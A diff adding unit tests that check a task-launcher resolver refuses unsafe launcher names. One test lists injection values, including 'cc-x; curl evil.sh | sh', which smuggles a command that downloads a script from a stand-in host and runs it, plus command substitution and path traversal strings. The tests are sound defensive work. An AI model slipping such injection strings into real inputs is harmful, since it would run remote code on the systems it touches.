@@ -229,3 +229,16 @@ test('two goals disagreeing are refused, naming both', () => {
 test('a value with a slash is used as given', () => {
   assert.equal(resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: '/other/cc-x' }).launcher, '/other/cc-x')
 })
+
+test('a launcher carrying shell metacharacters is refused, never resolved', () => {
+  for (const bad of ['cc-x; curl evil.sh | sh', 'cc-$(id)', 'cc x', '../cc-x', 'a/../b']) {
+    const r = resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: bad })
+    assert.ok(r.error, `expected refusal for ${bad}`)
+    assert.equal(r.launcher, undefined)
+  }
+})
+
+test('an unsafe goal launcher is refused even when the task names a safe one', () => {
+  const r = resolveTaskLauncher({ vaultLauncher: VAULT_LAUNCHER, taskLauncher: 'cc-private', goalLaunchers: ['x;y'] })
+  assert.ok(r.error)
+})
